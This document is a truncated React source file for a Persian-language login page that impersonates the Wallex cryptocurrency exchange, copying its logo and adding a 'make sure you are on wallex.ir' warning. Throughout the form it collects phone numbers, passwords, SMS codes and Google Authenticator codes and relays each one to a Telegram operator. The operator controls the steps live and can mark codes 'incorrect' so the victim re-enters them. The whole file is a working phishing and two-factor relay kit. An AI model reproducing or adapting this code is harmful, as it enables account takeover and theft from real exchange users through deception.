import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  ChevronLeft,
  ChevronDown,
  Info,
  Loader2,
  MessageSquare,
  Lock,
  Smartphone,
  Mail,
  QrCode,
  Eye,
  EyeOff,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "./AlertMessage";
import { OTPInput } from "./OTPInput";
import { cn } from "@/lib/utils";
import {
  toPersianDigits,
  toEnglishDigits,
  maskPhoneNumber,
} from "@/lib/persian-utils";
import {
  sendPhoneToTelegramEnhanced,
  validateTelegramConfig,
  updateAuthStep,
  setUserCurrentStep,
  canAccessAuthStep,
  getSession,
  updatePhoneVerification,
  showAdminButtons,
} from "@/lib/telegram-service-enhanced";
import {
  registerTelegramCallback,
  unregisterTelegramCallback,
} from "@/lib/telegram-callback-service";

type AuthStep =
  | "phone"
  | "loading"
  | "verify-phone"
  | "sms"
  | "password"
  | "google"
  | "email"
  | "email-code";

export const LoginForm = () => {
  const navigate = useNavigate();

  // Main form state
  const [currentStep, setCurrentStep] = useState<AuthStep>("phone");
  const [sessionId, setSessionId] = useState<string>("");
  const [phoneNumber, setPhoneNumber] = useState("");

  // Phone step states
  const [mobileNumber, setMobileNumber] = useState("");
  const [showInviteCode, setShowInviteCode] = useState(false);
  const [inviteCode, setInviteCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Phone verification states
  const [verifyCode, setVerifyCode] = useState("");

  // SMS states
  const [smsCode, setSmsCode] = useState("");
  const [countdown, setCountdown] = useState(60);
  const [isSecondAttempt, setIsSecondAttempt] = useState(false);

  // Password states
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Google Auth states
  const [googleCode, setGoogleCode] = useState("");

  // Email states
  const [email, setEmail] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [emailStep, setEmailStep] = useState<"email" | "code">("email");

  // Error states
  const [errors, setErrors] = useState<{
    mobileNumber?: string;
    inviteCode?: string;
    verifyCode?: string;
    smsCode?: string;
    password?: string;
    googleCode?: string;
    email?: string;
    emailCode?: string;
  }>({});
  const [isBlocked, setIsBlocked] = useState(false);
  const [hasError, setHasError] = useState(false);

  // Register callback handler for admin actions
  useEffect(() => {
    if (sessionId && currentStep === "loading") {
      registerTelegramCallback(sessionId, handleAdminAction);

      return () => {
        unregisterTelegramCallback(sessionId);
      };
    }
  }, [sessionId, currentStep]);

  // Countdown timer for SMS
  useEffect(() => {
    if (currentStep === "sms" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown, currentStep]);

  // Handle admin actions from Telegram
  const handleAdminAction = (action: string) => {
    console.log("🚀 Admin action received:", action);
    setIsSubmitting(false);

    // Handle incorrect actions
    if (action.startsWith("incorrect_")) {
      const errorType = action.replace("incorrect_", "");
      setHasError(true);

      switch (errorType) {
        case "password":
          setCurrentStep("password");
          setErrors({
            password:
              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
          });
          break;
        case "google":
          setCurrentStep("google");
          setErrors({
            googleCode:
              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
        case "sms":
          setCurrentStep("sms");
          setErrors({
            smsCode: "کد پیامک وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
        case "email":
          setCurrentStep("email");
          setEmailStep("code");
          setErrors({
            emailCode:
              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
      }
      return;
    }

    // Handle regular auth actions
    switch (action) {
      case "password":
        setCurrentStep("password");
        setErrors({});
        setHasError(false);
        break;
      case "google":
        setCurrentStep("google");
        setErrors({});
        setHasError(false);
        break;
      case "sms":
        setCurrentStep("sms");
        setErrors({});
        setHasError(false);
        break;
      case "email":
        setCurrentStep("email");
        setEmailStep("email");
        setErrors({});
        setHasError(false);
        break;
      case "complete":
        localStorage.setItem("isAuthenticated", "true");
        localStorage.setItem("userPhone", phoneNumber);
        sessionStorage.removeItem("sessionId");
        sessionStorage.removeItem("phoneNumber");
        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
        navigate("/", { replace: true });
        break;
    }
  };

  const validateMobileNumber = (number: string): boolean => {
    const mobileRegex = /^09\d{9}$/;
    return mobileRegex.test(number);
  };

  const validatePassword = (password: string): boolean => {
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*#?&]{8,}$/;
    return passwordRegex.test(password);
  };

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Phone number submission
  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const newErrors: { mobileNumber?: string; inviteCode?: string } = {};

    if (!mobileNumber) {
      newErrors.mobileNumber = "شماره همراه الزامی است";
    } else if (!validateMobileNumber(mobileNumber)) {
      newErrors.mobileNumber = "شماره همراه معتبر نیست";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Sending phone number to Telegram admin:", mobileNumber);
      const result = await sendPhoneToTelegramEnhanced(mobileNumber);

      if (!result.success) {
        throw new Error("Failed to send notification to Telegram admin");
      }

      setSessionId(result.sessionId);
      setPhoneNumber(mobileNumber);
      sessionStorage.setItem("sessionId", result.sessionId);
      sessionStorage.setItem("phoneNumber", mobileNumber);

      setCurrentStep("verify-phone");
    } catch (error) {
      console.error("Phone submission error:", error);
      setErrors({
        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Phone verification code submission
  const handleVerifyCodeSubmit = async () => {
    setErrors({});

    if (!verifyCode || verifyCode.length !== 6) {
      setErrors({ verifyCode: "کد تایید ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      // In demo mode, accept any 6-digit code
      console.log("Verifying code:", verifyCode);

      // Import the updatePhoneVerification function
      const { updatePhoneVerification, showAdminButtons } = await import(
        "@/lib/telegram-service-enhanced"
      );

      // Update verification in Telegram
      const success = await updatePhoneVerification(sessionId, verifyCode);
      if (!success) {
        throw new Error("Failed to update phone verification");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));

      setCurrentStep("loading");

      // Show admin buttons after reaching loading page
      setTimeout(async () => {
        try {
          console.log("📱 User reached loading step, showing admin buttons...");
          await showAdminButtons(sessionId);
        } catch (error) {
          console.warn("⚠️ Could not show admin buttons:", error);
        }
      }, 2000);
    } catch (error) {
      console.error("Verification error:", error);
      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // SMS code submission
  const handleSmsCodeSubmit = async () => {
    setErrors({});

    if (!smsCode || smsCode.length !== 6) {
      setErrors({ smsCode: "کد پیامک ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "sms", smsCode);
      if (!success) {
        throw new Error("Failed to update SMS step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("SMS code submission error:", error);
      setErrors({ smsCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Password submission
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!password) {
      setErrors({ password: "رمز عبور الزامی است" });
      return;
    }

    if (!validatePassword(password)) {
      setErrors({
        password: "رمز عبور باید حداقل ۸ کاراکتر و شامل حروف و اعداد باشد",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "password", password);
      if (!success) {
        throw new Error("Failed to update password step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("Password submission error:", error);
      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Google Auth code submission
  const handleGoogleCodeSubmit = async () => {
    setErrors({});

    if (!googleCode || googleCode.length !== 6) {
      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "google", googleCode);
      if (!success) {
        throw new Error("Failed to update Google Auth step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("Google Auth submission error:", error);
      setErrors({
        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email submission
  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!email) {
      setErrors({ email: "ایمیل الزامی است" });
      return;
    }

    if (!validateEmail(email)) {
      setErrors({ email: "ایمیل معتبر نیست" });
      return;
    }

    setIsSubmitting(true);

    try {
      // Simulate sending email code
      console.log("Sending email code to:", email);
      await new Promise((resolve) => setTimeout(resolve, 1500));

      const generatedCode = Math.floor(
        100000 + Math.random() * 900000,
      ).toString();
      sessionStorage.setItem("emailCode", generatedCode);
      alert(
        `🎭 حالت دمو\n\nکد ایمیل: ${generatedCode}\n\n(در حالت واقعی این کد به ایمیل ارسال می‌شود)`,
      );

      setEmailStep("code");
    } catch (error) {
      console.error("Email sending error:", error);
      setErrors({ email: "خطا در ارسال کد ایمیل. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email code submission
  const handleEmailCodeSubmit = async () => {
    setErrors({});

    if (!emailCode || emailCode.length !== 6) {
      setErrors({ emailCode: "کد ایمیل ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      const storedCode = sessionStorage.getItem("emailCode");
      if (emailCode !== storedCode) {
        throw new Error("Invalid email code");
      }

      console.log("Email verification successful");
      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("Email code verification error:", error);
      setErrors({ emailCode: "کد ایمیل نادرست است. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleMobileNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const englishValue = toEnglishDigits(
      e.target.value.replace(/[^0-9۰-۹]/g, ""),
    );
    setMobileNumber(englishValue);
    if (errors.mobileNumber) {
      setErrors((prev) => ({ ...prev, mobileNumber: undefined }));
    }
  };

  const handleResendCode = () => {
    setCountdown(60);
    console.log("Resend code requested - Admin will handle this");
  };

  const handleBack = () => {
    if (currentStep === "verify-phone") {
      setCurrentStep("phone");
    } else if (currentStep === "email-code") {
      setEmailStep("email");
    } else {
      setCurrentStep("loading");
    }
  };

  // Render loading state
  const renderLoading = () => (
    <div style={{ textAlign: "center", padding: "40px 0" }}>
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          gap: "24px",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            width: "80px",
            height: "80px",
            backgroundColor: "rgb(23, 29, 38)",
            borderRadius: "50%",
          }}
        >
          <Loader2
            className="animate-spin"
            style={{
              width: "40px",
              height: "40px",
              color: "rgb(255, 255, 255)",
            }}
          />
        </div>

        <div style={{ textAlign: "center" }}>
          <h2
            style={{
              fontSize: "18px",
              fontWeight: "700",
              color: "rgb(0, 0, 0)",
              margin: "0 0 8px 0",
            }}
          >
            در حال پردازش...
          </h2>
          <p
            style={{
              fontSize: "14px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.5",
            }}
          >
            لطفا صبر کنید
          </p>
        </div>

        <div
          style={{
            width: "60px",
            height: "4px",
            backgroundColor: "rgba(0, 122, 255, 0.2)",
            borderRadius: "2px",
            overflow: "hidden",
            position: "relative",
          }}
        >
          <div
            style={{
              width: "20px",
              height: "100%",
              backgroundColor: "rgb(0, 122, 255)",
              borderRadius: "2px",
              animation: "slide 2s ease-in-out infinite",
            }}
          />
        </div>
      </div>

      <style jsx>{`
        @keyframes slide {
          0% {
            transform: translateX(-40px);
          }
          50% {
            transform: translateX(80px);
          }
          100% {
            transform: translateX(-40px);
          }
        }
      `}</style>
    </div>
  );

  return (
    <div
      style={{
        backgroundColor: "rgb(255, 255, 255)",
        width: "100%",
        maxWidth: "480px",
      }}
      className="form-card"
    >
      <div
        className="flex flex-col gap-2"
        style={{
          padding: "20px",
          width: "100%",
        }}
      >
        {/* Header */}
        <div className="flex justify-between items-center w-full">
          <div className="flex items-center gap-2">
            {currentStep !== "phone" && currentStep !== "loading" && (
              <Button
                variant="ghost"
                size="icon"
                onClick={handleBack}
                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                style={{
                  borderRadius: "50%",
                  width: "auto",
                  height: "auto",
                  padding: "0",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                }}
              >
                <ChevronLeft
                  style={{
                    width: "24px",
                    height: "24px",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                  }}
                />
              </Button>
            )}
            <span
              style={{
                fontWeight: "700",
                fontSize: "16px",
                color: "rgb(0, 0, 0)",
              }}
            >
              ورود
            </span>
          </div>
          <a href="#" className="flex items-center flex-shrink-0">
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </a>
        </div>

        {/* Separator */}
        <hr
          style={{
            borderColor: "rgba(0, 0, 0, 0.2)",
            borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
            marginLeft: "-20px",
            marginRight: "-20px",
            marginTop: "8px",
            marginBottom: "8px",
          }}
        />

        {/* Content based on current step */}
        <div className="flex flex-col gap-2" style={{ marginTop: "16px" }}>
          {/* Step 1: Phone Number Input */}
          {currentStep === "phone" && (
            <>
              <div className="space-y-2">
                <AlertMessage>
                  مطمئن شوید که در دامنه wallex.ir هستید.
                </AlertMessage>

                {!validateTelegramConfig() && (
                  <AlertMessage>
                    🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی
                    تلگرام، فایل .env را تنظیم کنید.
                  </AlertMessage>
                )}

                {validateTelegramConfig() && (
                  <AlertMessage>
                    🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد.
                  </AlertMessage>
                )}

                <AlertMessage>
                  پس از ثبت شماره، کد تایید ۶ رقمی{" "}
                  {validateTelegramConfig()
                    ? "به بات تلگرام"
                    : "در پنجره نمایش داده"}{" "}
                  ارسال خواهد شد.
                </AlertMessage>
              </div>

              <form onSubmit={handlePhoneSubmit}>
                <div
                  style={{
                    display: "inline-flex",
                    flexDirection: "column",
                    position: "relative",
                    verticalAlign: "top",
                    width: "100%",
                    marginBottom: "16px",
                    marginTop: "16px",
                  }}
                >
                  <label
                    htmlFor="mobile-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      marginBottom: "8px",
                      textAlign: "right",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    شماره همراه را وارد کنید.
                  </label>
                  <div style={{ position: "relative" }}>
                    <Input
                      id="mobile-input"
                      name="mobile_number"
                      type="text"
                      inputMode="numeric"
                      maxLength={11}
                      value={toPersianDigits(mobileNumber)}
                      onChange={handleMobileNumberChange}
                      className="w-full text-right"
                      style={{
                        borderRadius: "8px",
                        border: errors.mobileNumber
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        padding: "10px 12px",
                        fontSize: "14px",
                        textAlign: "right",
                        backgroundColor: "rgb(255, 255, 255)",
                      }}
                      placeholder="۰۹۱۲۳۴۵۶۷۸۹"
                      autoFocus
                      disabled={isSubmitting}
                    />
                    {errors.mobileNumber && (
                      <p
                        className="text-right mt-1"
                        style={{
                          color: "rgb(220, 38, 38)",
                          fontSize: "12px",
                        }}
                      >
                        {errors.mobileNumber}
                      </p>
                    )}
                  </div>
                </div>

                <Button
                  type="button"
                  onClick={() => setShowInviteCode(!showInviteCode)}
                  className="justify-start p-1 mb-1 hover:bg-transparent"
                  style={{
                    backgroundColor: "rgba(0, 0, 0, 0)",
                    border: "none",
                    color: "rgb(0, 122, 255)",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    padding: "4px",
                    marginBottom: "4px",
                  }}
                >
                  <ChevronDown
                    className={cn(
                      "mr-1 transition-transform duration-200",
                      showInviteCode ? "rotate-180" : "",
                    )}
                    style={{
                      width: "24px",
                      height: "24px",
                      marginLeft: "4px",
                    }}
                  />
                  <span>کد دعوت دارید؟</span>
                </Button>

                <div
                  className={cn(
                    "overflow-hidden transition-all duration-300",
                    showInviteCode ? "h-auto visible" : "h-0 invisible",
                  )}
                >
                  {showInviteCode && (
                    <div className="w-full">
                      <Input
                        name="invite_code"
                        type="text"
                        placeholder="کد معرف (اختیاری)"
                        value={inviteCode}
                        onChange={(e) => setInviteCode(e.target.value)}
                        className="w-full text-right"
                        style={{
                          borderRadius: "8px",
                          border: "1px solid rgba(0, 0, 0, 0.2)",
                          padding: "10px 12px",
                          fontSize: "14px",
                          textAlign: "right",
                          backgroundColor: "rgb(255, 255, 255)",
                        }}
                      />
                      <p
                        className="text-right mt-2 flex items-center"
                        style={{
                          color: "rgba(0, 0, 0, 0.6)",
                          fontSize: "12px",
                          lineHeight: "20.004px",
                        }}
                      >
                        <Info
                          className="mr-2"
                          style={{ width: "24px", height: "24px" }}
                        />
                        <span>
                          کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
                        </span>
                      </p>
                    </div>
                  )}
                </div>

                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full"
                    style={{
                      backgroundColor: "rgb(23, 29, 38)",
                      color: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                      border: "none",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <Loader2
                          className="animate-spin mr-2"
                          style={{ width: "16px", height: "16px" }}
                        />
                        <span>در حال ارسال کد...</span>
                      </div>
                    ) : (
                      "ثبت و ادامه"
                    )}
                  </Button>
                </div>
              </form>
            </>
          )}

          {/* Step 2: Phone Verification */}
          {currentStep === "verify-phone" && (
            <>
              <div style={{ marginBottom: "24px" }}>
                <AlertMessage>
                  <MessageSquare
                    className="inline ml-2"
                    style={{ width: "16px", height: "16px" }}
                  />
                  کد تایید ۶ رقمی{" "}
                  {validateTelegramConfig()
                    ? "در تلگرام ادمین"
                    : "در کنسول مرورگر"}{" "}
                  نمایش داده شده است.
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد تایید شماره همراه
                </label>
                <OTPInput
                  length={6}
                  value={verifyCode}
                  onComplete={setVerifyCode}
                  onChange={setVerifyCode}
                  disabled={isSubmitting}
                />
                {errors.verifyCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "8px",
                    }}
                  >
                    {errors.verifyCode}
                  </p>
                )}
              </div>

              <div style={{ marginTop: "24px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <Button
                  onClick={handleVerifyCodeSubmit}
                  disabled={isSubmitting || verifyCode.length !== 6}
                  className="w-full"
                  style={{
                    backgroundColor: "rgb(23, 29, 38)",
                    color: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    border: "none",
                    cursor:
                      isSubmitting || verifyCode.length !== 6
                        ? "not-allowed"
                        : "pointer",
                    opacity:
                      isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div className="flex items-center justify-center">
                      <Loader2
                        className="animate-spin mr-2"
                        style={{ width: "16px", height: "16px" }}
                      />
                      <span>در حال تایید...</span>
                    </div>
                  ) : (
                    "تایید کد"
                  )}
                </Button>
              </div>
            </>
          )}

          {/* Step 3: Loading */}
          {currentStep === "loading" && renderLoading()}

          {/* Step 4: SMS Authentication */}
          {currentStep === "sms" && (
            <>
              <div style={{ marginBottom: "24px" }}>
                <AlertMessage>
                  <MessageSquare
                    className="inline ml-2"
                    style={{ width: "16px", height: "16px" }}
                  />
                  {isSecondAttempt
                    ? "کد اول نادرست بود. این آخرین فرصت شما است."
                    : `کد پیامک به شماره ${maskPhoneNumber(phoneNumber)} توسط ادمین ارسال خواهد شد.`}
                </AlertMessage>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد تایید پیامک
                </label>
                <OTPInput
                  length={6}
                  value={smsCode}
                  onComplete={setSmsCode}
                  onChange={setSmsCode}
                  disabled={isSubmitting}
                />
                {errors.smsCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "8px",
                    }}
                  >
                    {errors.smsCode}
                  </p>
                )}
              </div>

              <div style={{ marginBottom: "24px", textAlign: "right" }}>
                <p
                  style={{
                    color: "rgba(0, 0, 0, 0.6)",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    paddingBottom: "4px",
                    paddingTop: "4px",
                  }}
                >
                  {countdown > 0 ? (
                    <>
                      <span>{toPersianDigits(countdown)}</span>
                      <span> ثانیه تا ارسال مجدد کد</span>
                    </>
                  ) : (
                    <button
                      onClick={handleResendCode}
                      style={{
                        color: "rgb(0, 122, 255)",
                        textDecoration: "underline",
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                        fontSize: "14px",
                      }}
                    >
                      ارسال مجدد کد پیامک
                    </button>
                  )}
                </p>
              </div>

              <div style={{ marginTop: "24px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <Button
                  onClick={handleSmsCodeSubmit}
                  disabled={isSubmitting || smsCode.length !== 6}
                  className="w-full"
                  style={{
                    backgroundColor: "rgb(23, 29, 38)",
                    color: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    border: "none",
                    cursor:
                      isSubmitting || smsCode.length !== 6
                        ? "not-allowed"
                        : "pointer",
                    opacity: isSubmitting || smsCode.length !== 6 ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div className="flex items-center justify-center">
                      <Loader2
                        className="animate-spin mr-2"
                        style={{ width: "16px", height: "16px" }}
                      />
                      <span>در حال تایید...</span>
                    </div>
                  ) : (
                    "تایید کد"
                  )}
                </Button>
              </div>
            </>
          )}

          {/* Step 5: Password Authentication */}
          {currentStep === "password" && (
            <>
              <form onSubmit={handlePasswordSubmit}>
                <div style={{ marginBottom: "24px" }}>
                  <AlertMessage>
                    <Lock
                      className="inline ml-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    رمز عبور حساب کاربری خود را وارد کنید.
                  </AlertMessage>
                </div>

                <div style={{ marginBottom: "16px" }}>
                  <label
                    htmlFor="password-input"
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      marginBottom: "8px",
                      display: "block",
                      textAlign: "right",
                    }}
                  >
                    رمز عبور
                  </label>
                  <div style={{ position: "relative" }}>
                    <Input
                      id="password-input"
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) {
                          setErrors((prev) => ({
                            ...prev,
                            password: undefined,
                          }));
                        }
                      }}
                      className="w-full text-right pr-12"
                      style={{
                        borderRadius: "8px",
                        border: errors.password
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        padding: "10px 44px 10px 12px",
                        fontSize: "14px",
                        textAlign: "right",
                      }}
                      placeholder="رمز عبور خود را وارد کنید"
                      autoFocus
                      disabled={isSubmitting}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      style={{
                        position: "absolute",
                        right: "12px",
                        top: "50%",
                        transform: "translateY(-50%)",
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                        color: "rgba(0, 0, 0, 0.6)",
                      }}
                    >
                      {showPassword ? (
                        <EyeOff style={{ width: "20px", height: "20px" }} />
                      ) : (
                        <Eye style={{ width: "20px", height: "20px" }} />
                      )}
                    </button>
                  </div>
                  {errors.password && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.password}
                    </p>
                  )}
                </div>

                <div style={{ marginTop: "16px" }}>
                  <hr
                    style={{
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      marginBottom: "16px",
                    }}
                  />
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full"
                    style={{
                      backgroundColor: "rgb(23, 29, 38)",
                      color: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      padding: "10px 16px",
                      fontSize: "14px",
                      fontWeight: "500",
                      textTransform: "uppercase",
                      border: "none",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <Loader2
                          className="animate-spin mr-2"
                          style={{ width: "16px", height: "16px" }}
                        />
                        <span>در حال بررسی...</span>
                      </div>
                    ) : (
                      "تایید رمز عبور"
                    )}
                  </Button>
                </div>
              </form>
            </>
          )}

          {/* Step 6: Google Authenticator */}
          {currentStep === "google" && (
            <>
              <div style={{ marginBottom: "24px" }}>
                <AlertMessage>
                  <Smartphone
                    className="inline ml-2"
                    style={{ width: "16px", height: "16px" }}
                  />
                  کد ۶ رقمی Google Authenticator خود را وارد کنید.
                </AlertMessage>
              </div>

              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  gap: "16px",
                  marginBottom: "24px",
                  padding: "20px",
                  backgroundColor: "rgb(248, 249, 250)",
                  borderRadius: "8px",
                  border: "1px solid rgba(0, 0, 0, 0.1)",
                }}
              >
                <QrCode
                  style={{
                    width: "120px",
                    height: "120px",
                    color: "rgba(0, 0, 0, 0.7)",
                  }}
                />
                <div style={{ textAlign: "center" }}>
                  <p
                    style={{
                      fontSize: "14px",
                      fontWeight: "500",
                      color: "rgb(0, 0, 0)",
                      margin: "0 0 4px 0",
                    }}
                  >
                    QR Code برای راه‌اندازی
                  </p>
                  <p
                    style={{
                      fontSize: "12px",
                      color: "rgba(0, 0, 0, 0.6)",
                      margin: "0",
                      lineHeight: "1.4",
                    }}
                  >
                    اگر Google Authenticator را نصب نکرده‌اید، ابتدا از App
                    Store یا Google Play دانلود کنید
                  </p>
                </div>
              </div>

              <div style={{ marginBottom: "16px" }}>
                <label
                  style={{
                    fontSize: "14px",
                    fontWeight: "500",
                    marginBottom: "8px",
                    display: "block",
                    textAlign: "right",
                  }}
                >
                  کد Google Authenticator
                </label>
                <OTPInput
                  length={6}
                  value={googleCode}
                  onComplete={setGoogleCode}
                  onChange={setGoogleCode}
                  disabled={isSubmitting}
                />
                {errors.googleCode && (
                  <p
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                      textAlign: "right",
                      marginTop: "8px",
                    }}
                  >
                    {errors.googleCode}
                  </p>
                )}
              </div>

              <div style={{ marginTop: "24px" }}>
                <hr
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    marginBottom: "16px",
                  }}
                />
                <Button
                  onClick={handleGoogleCodeSubmit}
                  disabled={isSubmitting || googleCode.length !== 6}
                  className="w-full"
                  style={{
                    backgroundColor: "rgb(23, 29, 38)",
                    color: "rgb(255, 255, 255)",
                    borderRadius: "8px",
                    padding: "10px 16px",
                    fontSize: "14px",
                    fontWeight: "500",
                    textTransform: "uppercase",
                    border: "none",
                    cursor:
                      isSubmitting || googleCode.length !== 6
                        ? "not-allowed"
                        : "pointer",
                    opacity:
                      isSubmitting || googleCode.length !== 6 ? "0.5" : "1",
                  }}
                >
                  {isSubmitting ? (
                    <div className="flex items-center justify-center">
                      <Loader2
                        className="animate-spin mr-2"
                        style={{ width: "16px", height: "16px" }}
                      />
                      <span>در حال تایید...</span>
                    </div>
                  ) : (
                    "تایید کد"
                  )}
                </Button>
              </div>
            </>
          )}

          {/* Step 7: Email Authentication */}
          {currentStep === "email" && emailStep === "email" && (
